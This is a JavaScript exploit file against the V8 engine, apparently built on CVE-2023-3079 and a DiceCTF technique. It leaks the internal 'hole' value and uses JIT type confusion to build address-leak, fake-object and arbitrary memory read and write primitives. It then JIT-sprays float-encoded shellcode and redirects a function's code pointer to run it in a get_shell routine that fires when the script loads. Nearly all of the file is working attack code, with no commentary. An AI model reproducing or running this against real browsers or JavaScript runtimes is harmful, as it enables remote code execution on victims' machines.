
// References: 
//    https://github.com/mistymntncop/CVE-2023-3079/blob/main/exploit.js
//    https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html

const FIXED_ARRAY_HEADER_SIZE = 0x08n;
var arr_buf = new ArrayBuffer(8);
var f64_arr = new Float64Array(arr_buf);
var b64_arr = new BigInt64Array(arr_buf);
function ftoi(f) {
  f64_arr[0] = f;
  return b64_arr[0];
}
function itof(i) {
  b64_arr[0] = i;
  return f64_arr[0];
}
function smi(i) {
  return i << 1n;
}

function gc_minor() {
  for (let i = 0; i < 1000; ++i) {
    new ArrayBuffer(0x10000);
  }
}
function gc_major() {
  new ArrayBuffer(0x7fe00000);
}

function leak_hole() {
  function set_prop(obj, prop, val) {
    obj[prop] = val;
  }

  for (let i = 0; i < 10; ++i) {
    set_prop(arguments, 'x', 1);
  }

  let tmp = [];
  set_prop(tmp, 1, 1);

  set_prop(arguments, arguments.length, 1);
  let hole = arguments[arguments.length + 1];

  return hole;
}

const the = {};
var large_arr = new Array(0x10000);
large_arr.fill(itof(0xDEADBEE0n));
var fake_arr = null;
var fake_arr_addr = null;
var fake_arr_elements_addr = null;

var packed_double_map = null;
var packed_double_properties = null;

var packed_map = null;
var packed_properties = null;

function leak_stuff(b) {
  if (b) {
    let index = Number(b ? the.hole : -1);
    index |= 0;
    index += 1;

    let arr1 = [1.1, 2.2, 3.3, 4.4];
    let arr2 = [0x1337, large_arr];

    let packed_double_map_and_properties = arr1.at(index * 4);
    let packed_double_elements_and_len = arr1.at(index * 5);

    let packed_map_and_properties = arr1.at(index * 8);
    let packed_elements_and_len = arr1.at(index * 9);

    let fixed_arr_map = arr1.at(index * 6);
    let large_arr_addr = arr1.at(index * 7);

    return [
      packed_double_map_and_properties, packed_double_elements_and_len,
      packed_map_and_properties, packed_elements_and_len,
      fixed_arr_map, large_arr_addr,
      arr1, arr2
    ];
  }
  return 0;
}
function weak_fake_obj(b, addr = 1.1) {
  if (b) {
    let index = Number(b ? the.hole : -1);
    index |= 0;
    index += 1;

    let arr1 = [0x1337, {}];
    let arr2 = [addr, 2.2, 3.3, 4.4];

    let fake_obj = arr1.at(index * 8);

    return [
      fake_obj,
      arr1, arr2
    ]
  }
  return 0;
}
function fake_obj(addr) {
  large_arr[0] = itof(packed_map | (packed_double_properties << 32n));
  large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));
  large_arr[3] = itof(addr | 1n);

  let result = fake_arr[0];

  large_arr[1] = itof(0n | (smi(0n) << 32n));

  return result;
}
function addr_of(obj) {
  large_arr[0] = itof(packed_double_map | (packed_double_properties << 32n));
  large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));

  fake_arr[0] = obj;
  let result = ftoi(large_arr[3]) & 0xFFFFFFFFn;

  large_arr[1] = itof(0n | (smi(0n) << 32n));

  return result;
}
function install_primitives() {
  for (let i = 0; i < 10; ++i) {
    weak_fake_obj(true, 1.1);
  }
  for (let i = 0; i < 10000; ++i) {
    weak_fake_obj(false, 1.1);
  }

  for (let i = 0; i < 10; ++i) {
    leak_stuff(true);
  }
  for (let i = 0; i < 20000; ++i) {
    leak_stuff(false);
  }

  gc_minor();
  gc_major();

  let leaks = leak_stuff(true);

  let packed_double_map_and_properties = ftoi(leaks[0]);
  let packed_double_elements_and_len = ftoi(leaks[1]);
  packed_double_map = packed_double_map_and_properties & 0xFFFFFFFFn;
  packed_double_properties = packed_double_map_and_properties >> 32n;
  let packed_double_elements = packed_double_elements_and_len & 0xFFFFFFFFn;

  let packed_map_and_properties = ftoi(leaks[2]);
  let packed_elements_and_len = ftoi(leaks[3]);
  packed_map = packed_map_and_properties & 0xFFFFFFFFn;
  packed_properties = packed_map_and_properties >> 32n;
  let packed_elements = packed_elements_and_len & 0xFFFFFFFFn;

  let fixed_arr_map = ftoi(leaks[4]) & 0xFFFFFFFFn;

  let large_arr_addr = ftoi(leaks[5]) >> 32n;

  let double_arr = leaks[6];
  double_arr[0] = itof(packed_double_map | (packed_double_properties << 32n));
  double_arr[1] = itof(large_arr_addr | (smi(1n) << 32n));

  let temp_fake_arr_addr = (packed_double_elements + FIXED_ARRAY_HEADER_SIZE) | 1n;

  let temp_fake_arr = weak_fake_obj(true, itof(temp_fake_arr_addr));
  let large_arr_elements_addr = ftoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
  fake_arr_addr = large_arr_elements_addr + FIXED_ARRAY_HEADER_SIZE;
  fake_arr_elements_addr = fake_arr_addr + 0x10n;

  large_arr[0] = itof(packed_double_map | (packed_double_properties << 32n));
  large_arr[1] = itof(fake_arr_elements_addr | (smi(0n) << 32n));
  large_arr[2] = itof(fixed_arr_map | (smi(0n) << 32n));

  fake_arr = weak_fake_obj(true, itof(fake_arr_addr))[0];

  temp_fake_arr = null;
}

function v8_read64(addr) {
  addr -= FIXED_ARRAY_HEADER_SIZE;
  large_arr[0] = itof(packed_double_map | (packed_double_properties << 32n));
  large_arr[1] = itof((addr | 1n) | (smi(1n) << 32n));

  let result = ftoi(fake_arr[0]);

  large_arr[1] = itof(0n | (smi(0n) << 32n));

  return result;
}
function v8_write64(addr, val) {
  addr -= FIXED_ARRAY_HEADER_SIZE;

  large_arr[0] = itof(packed_double_map | (packed_double_properties << 32n));
  large_arr[1] = itof((addr | 1n) | (smi(1n) << 32n));

  fake_arr[0] = itof(val);

  large_arr[1] = itof(0n | (smi(0n) << 32n));
}

const jit_spary_function = () => {
  return [1.0,
    1.95538254221075331056310651818E-246,
    1.95606125582421466942709801013E-246,
    1.99957147195425773436923756715E-246,
    1.95337673326740932133292175341E-246,
    2.63486047652296056448306022844E-284];
}

function get_shell() {
  for (let i = 0; i < 0x10000; i++) {
    jit_spary_function(); jit_spary_function(); jit_spary_function(); jit_spary_function();
  }

  let jsf_addr = addr_of(jit_spary_function);
  let jsf_code_loccation = jsf_addr + 0x18n;
  let jsf_code_addr = v8_read64(jsf_code_loccation) & 0xFFFFFFFFn;
  let jsf_byte_code_location = jsf_code_addr + 0x10n;
  let jsf_byte_code_addr = v8_read64(jsf_byte_code_location);
  let new_jsf_byte_code_addr = jsf_byte_code_addr + 0x69n;
  v8_write64(jsf_byte_code_location, new_jsf_byte_code_addr);

  jit_spary_function();
}

function pwn() {
  the.hole = leak_hole();
  install_primitives();

  get_shell();
}

if (typeof module == 'undefined') {
  pwn();
}